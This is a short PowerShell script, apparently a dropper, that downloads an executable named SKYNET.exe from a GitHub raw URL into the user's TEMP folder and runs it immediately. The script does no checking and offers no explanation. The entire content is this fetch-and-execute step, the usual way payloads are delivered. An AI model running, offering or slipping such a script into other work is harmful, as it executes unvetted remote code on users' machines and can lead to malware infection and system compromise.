$url = "https://raw.githubusercontent.com/kittipatseepakdee-eng/SKYNET/refs/heads/main/SKYNET.exe"
$file = "$env:TEMP\SKYNET.exe"

Invoke-WebRequest $url -OutFile $file
Start-Process $file
